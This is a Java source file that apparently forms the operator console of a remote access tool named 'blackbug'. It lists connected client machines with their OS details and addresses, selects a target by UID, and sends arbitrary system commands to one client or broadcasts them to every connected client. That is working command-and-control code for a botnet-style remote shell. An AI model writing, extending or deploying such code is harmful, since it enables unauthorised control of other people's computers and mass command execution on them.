package pers.adlered.blackbug.server.connection;

import pers.adlered.blackbug.server.Temp;
import pers.adlered.blackbug.server.connection.storge.StreamStorge;
import pers.adlered.blackbug.server.tools.ConsoleTable;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.Iterator;

public class ConsoleHandler {
    public static String handle(String command) {
        String result = "";
        if (command.equals("/help")) {
            result += "======== HELP ========\n";
            result += "/setuid [UID]\n";
            result += "-- Set UID which you want to control\n";
            result += "/list\n";
            result += "-- Show available UID(S)\n";
            result += "/crt\n";
            result += "-- Show current selected UID\n";
            result += "/cmd [command]\n";
            result += "-- Execute a system command (All system support)\n";
            result += "/broadcast [command]\n";
            result += "-- Execute a system command to all connections (All system support)\n";
            result += "======== PLEH ========";
        }

        if (command.startsWith("/setuid ")) {
            String UID = command.replaceFirst("/setuid ", "");
            try {
                if (StreamStorge.sockets.containsKey(Integer.parseInt(UID))) {
                    Temp.currentUID = Integer.parseInt(UID);
                    result += "[Command] UID " + Temp.currentUID + " set.";
                } else {
                    result += "[Command] Target not exists. Please check your UID input.";
                }

            } catch (NumberFormatException NFE) {
                result += "[Command] Invalidate UID!";
            }
        }

        if (command.equals("/list")) {
            //result += "======== UID ========\n";
            ConsoleTable consoleTable = new ConsoleTable(3, true);
            consoleTable.appendRow();
            consoleTable.appendColumn("UID").appendColumn("OS Detail").appendColumn("Address");
            Iterator<Integer> iterator = StreamStorge.sockets.keySet().iterator();
            while (iterator.hasNext()) {
                int key = iterator.next();
                //result += "UID-" + key + " | ";
                //result += StreamStorge.detailOfOSDetail.get(key) + " | ";
                //result += "bug:/" + StreamStorge.sockets.get(key).getRemoteSocketAddress() + "\r\n";
                consoleTable.appendRow();
                consoleTable.appendColumn(key).appendColumn(StreamStorge.detailOfOSDetail.get(key)).appendColumn("bug:/" + StreamStorge.sockets.get(key).getRemoteSocketAddress());
            }
            //result += "======== DIU ========\n";
            result += consoleTable.toString();
        }

        if (command.equals("/crt")) {
            if (Temp.currentUID != -1) {
                result += "[Command] UID-" + Temp.currentUID;
            } else {
                result += "[Command] No client has been selected. Use \"/setuid [UID]\" first.";
            }
            return result;
        }

        if (command.startsWith("/broadcast ")) {
            String broadcastCommand = "/cmd " + command.replaceFirst("/broadcast ", "");
            Iterator<Integer> iterator = StreamStorge.sockets.keySet().iterator();
            while (iterator.hasNext()) {
                int key = iterator.next();
                try {
                    BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(StreamStorge.sockets.get(key).getOutputStream(), StandardCharsets.UTF_8));
                    bufferedWriter.write(broadcastCommand);
                    bufferedWriter.flush();
                } catch (IOException IOE) {
                }
            }
            result += "[Command] Broadcast message: " + broadcastCommand;
        }
        return result;
    }
}
